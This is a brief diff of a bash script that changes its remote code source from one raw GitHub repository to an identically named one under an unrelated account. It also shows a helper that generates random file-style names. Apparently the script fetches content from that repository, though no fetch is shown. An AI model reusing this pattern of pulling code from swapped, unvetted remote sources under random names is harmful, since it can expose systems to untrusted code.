@@ -1,7 +1,7 @@
 #!/bin/bash
 
 mode="${1:-0}"
-src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
+src="https://raw.githubusercontent.com/edrivetokenbsc/2088/main"
 
 RandString() {
   n="${1:-2}"; s=""; for((i=0;i<n;i++)); do s=${s}$(echo "$[`od -An -N2 -i /dev/urandom` % 26 + 97]" |awk '{printf("%c", $1)}'); done; echo -n "$s";
